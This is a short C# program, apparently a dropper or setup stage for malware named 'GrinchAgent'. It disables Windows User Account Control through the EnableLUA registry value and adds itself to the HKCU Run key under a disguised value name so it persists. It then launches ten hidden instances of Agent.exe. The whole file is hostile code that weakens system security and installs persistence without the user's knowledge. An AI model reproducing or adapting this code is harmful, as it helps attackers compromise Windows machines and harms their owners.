
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AgentSetup
{
    class Program
    {
        static void Main(string[] args)
        {
            UACShutdown();
            registryPreparation("What are you looking for?");
            for(int i = 1; i <= 10; i++)
            {
                string agentId = "GrinchAgent" + i.ToString();
                readyToScream(agentId);
            }
            Environment.Exit(0);
        }

        static void UACShutdown()
        {
            var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
            key.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
            key.Close();
        }

        static void registryPreparation(string agentName)
        {
            var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue(agentName, System.Reflection.Assembly.GetEntryAssembly().Location);
            key.Close();
        }

        static void readyToScream(string agentId)
        {
            using (Process myProcess = new Process())
            {
                myProcess.StartInfo.UseShellExecute = false;
                myProcess.StartInfo.FileName = @"Agent.exe";
                myProcess.StartInfo.CreateNoWindow = true;
                myProcess.StartInfo.Arguments = agentId;
                myProcess.Start();
            }
        }
    }
}
